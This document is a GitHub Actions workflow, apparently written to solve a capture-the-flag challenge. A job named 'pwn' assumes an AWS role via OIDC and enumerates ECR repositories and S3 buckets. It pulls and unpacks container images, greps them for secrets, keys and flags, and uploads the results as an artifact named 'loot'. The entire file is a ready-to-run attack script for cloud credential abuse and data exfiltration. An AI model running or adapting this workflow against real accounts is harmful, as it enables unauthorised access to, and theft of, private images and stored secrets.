name: assume-aws-and-dump
on:
  workflow_dispatch:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS creds via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1

      - name: Whoami
        run: aws sts get-caller-identity

      # --- ECR ENUMERATION ---
      - name: List ECR repositories (names & URIs)
        id: ecr_repos
        run: |
          set -eux
          aws ecr describe-repositories \
            --query '{names:repositories[].repositoryName, uris:repositories[].repositoryUri}' \
            --output json > /tmp/ecr_repos.json || echo '{}' > /tmp/ecr_repos.json
          cat /tmp/ecr_repos.json

      - name: List images (tags/digests) per repo
        id: ecr_images
        run: |
          set -eux
          jq -r '.names[]?' /tmp/ecr_repos.json | while read -r repo; do
            echo "=== $repo ==="
            aws ecr list-images --repository-name "$repo" --query 'imageIds[]' --output json || true
          done

      - name: Docker login (if token allowed)
        run: |
          set -eux
          aws ecr get-login-password | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com

      - name: Try pulling discovered images (names & tags)
        run: |
          set -eux
          pulled=0
          for repo in $(jq -r '.names[]?' /tmp/ecr_repos.json); do
            # Try tags first
            for tag in $(aws ecr list-images --repository-name "$repo" --query 'imageIds[?imageTag].imageTag' --output text 2>/dev/null || true); do
              echo "[*] docker pull $repo:$tag"
              if docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag; then
                docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag -o image.tar
                pulled=1; break 2
              fi
            done
            # Fall back to digests
            for digest in $(aws ecr list-images --repository-name "$repo" --query 'imageIds[?imageDigest].imageDigest' --output text 2>/dev/null || true); do
              echo "[*] docker pull $repo@$digest"
              if docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo@$digest; then
                docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo@$digest -o image.tar
                pulled=1; break 2
              fi
            done
          done
          if [ "$pulled" -eq 0 ]; then
            echo "[!] No images pulled (likely missing ecr:BatchGetImage or repo not present)."
          fi

      # --- S3 ENUMERATION / PIVOT ---
      - name: List buckets in the account (if allowed)
        run: |
          set -eux
          aws s3api list-buckets --query 'Buckets[].Name' --output text || true

      - name: Probe likely S3 prefixes
        run: |
          set -eux
          # Check the public challenge bucket path too, in case the blob is there
          aws s3 ls s3://challenge-assets-production-empasoft-ctf/ --region ap-east-1 || true
          aws s3 ls s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ --region ap-east-1 || true
          # If your role has any bucket permissions in the target account, list them:
          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null || true); do
            echo "== $b =="
            aws s3 ls "s3://$b/" --recursive --human-readable --summarize || true
          done

      - name: Dump filesystem from image (if pulled)
        if: always()
        run: |
          set -eux
          if [ -f image.tar ]; then
            mkdir img && tar -xf image.tar -C img
            find img -type f -name 'layer.tar' -exec sh -c '
              for f in "$@"; do
                d=$(mktemp -d)
                tar -xf "$f" -C "$d"
                echo "[+] Searching $f"
                rg -n --hidden --no-messages -i "flag|secret|aes|gcm|pbkdf2|rockyou|base64|aad|REDACTED" "$d" || true
                tar -czf "$f.files.tgz" -C "$d" .
              done
            ' sh {} +
          fi

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: loot
          path: |
            /tmp/ecr_repos.json
            image.tar
            img/**/*
            **/*.files.tgz
          if-no-files-found: ignore
